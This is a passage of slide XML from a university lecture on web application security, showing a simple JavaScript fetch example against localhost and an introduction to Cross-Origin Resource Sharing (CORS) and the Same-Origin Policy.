                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>function</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>doFetch(){ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>fetch(</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="A21515"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="A21515"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                          <a:hlinkClick r:id="rId4"/>
                        </a:rPr>
                        <a:t>http://localhost:3000/</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="A21515"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>).then(data</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-75">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-85">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>{</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="843280" marR="6565900" indent="-251460">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>data.json().then(data</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-40">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>{ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>console.log(data)</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="591820">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>})</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="591820" marR="6817359" indent="-250190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dirty="0" sz="1800">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>}).catch(err</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-35">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>=&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:solidFill>
                            <a:srgbClr val="0000FF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dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>{ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>console.log(err.message)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B="0" marT="32384">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT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111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="519430">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="342265">
                        <a:lnSpc>
                          <a:spcPts val="1250"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>});</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Consolas"/>
                        <a:cs typeface="Consolas"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="92075">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:latin typeface="Consolas"/>
                          <a:cs typeface="Consolas"/>
                        </a:rPr>
                        <a:t>}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B="0" marT="0">
                    <a:lnL w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F3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111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:lnB w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F3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111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="192786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R w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnT w="12700">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                  </a:tcPr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111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnL>
                    <a:lnR w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnR>
                    <a:lnB w="9525">
                      <a:solidFill>
                        <a:srgbClr val="111F35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</a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld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130"/>
              <a:t>CROSS-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ORIGIN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-135"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t>RESOURCE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>SHARING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-140"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t>(CORS)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962050" y="1496596"/>
            <a:ext cx="10197465" cy="3057525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="48895" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="385"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Sometimes</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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need</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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content</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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different</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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origins!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="245"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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And,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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fact,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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already</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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did</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>so!</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1010"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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30">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Cross-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origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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Resource</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Sharing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>CORS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)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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mechanism</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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allows</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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server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	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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>«</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>opt-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>out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»</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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Same-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origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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Policy</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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specify</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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its</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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content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	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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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accessed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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also</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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some</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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origins</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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other</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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than</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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its</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>own</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="66675" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Server</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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include</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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specific</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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headers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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their</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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responses</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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declare</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>that </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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accessed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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specific</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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origins</a:t>
            </a:r>
            <a:endParaRPr sz="2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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld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40"/>
              <a:t>CORS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-185"/>
